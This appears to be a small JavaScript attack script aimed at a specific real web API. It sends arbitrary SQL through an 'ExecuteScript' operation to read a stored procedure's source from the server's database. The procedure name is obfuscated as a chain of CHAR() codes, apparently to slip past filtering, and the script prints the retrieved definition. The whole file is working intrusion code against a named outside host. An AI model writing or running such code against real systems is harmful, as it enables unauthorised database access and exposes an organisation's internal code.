async function run() {
  const sql = `
    SELECT definition 
    FROM sys.sql_modules 
    WHERE object_id = OBJECT_ID(
      CHAR(100)+CHAR(98)+CHAR(111)+CHAR(46)+
      CHAR(65)+CHAR(80)+CHAR(73)+CHAR(80)+CHAR(108)+CHAR(117)+CHAR(115)+
      CHAR(74)+CHAR(111)+CHAR(117)+CHAR(114)+CHAR(110)+CHAR(97)+CHAR(108)+
      CHAR(79)+CHAR(112)+CHAR(101)+CHAR(114)+CHAR(97)+CHAR(116)+CHAR(105)+CHAR(111)+CHAR(110)
    );
  `;

  try {
    const res = await fetch('https://sila.silasystem.com:7103/General/GeneralAPI/', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'SP_Name': 'APIPlusQueryOperation'
      },
      body: JSON.stringify({
        Operation: 'ExecuteScript',
        SqlStatement: sql,
        AppVersionWeb: '225',
        PlatForm: 'web'
      })
    });
    const data = await res.json();
    const definition = data.List0?.[0]?.definition || '';
    if (definition) {
      console.log('SP Definition length:', definition.length);
      console.log('--- START ---');
      console.log(definition.substring(0, 300));
      console.log('--- END ---');
      console.log(definition.substring(definition.length - 300));
    } else {
      console.log('SP definition not found.');
    }
  } catch (err) {
    console.error('Error:', err);
  }
}
run();
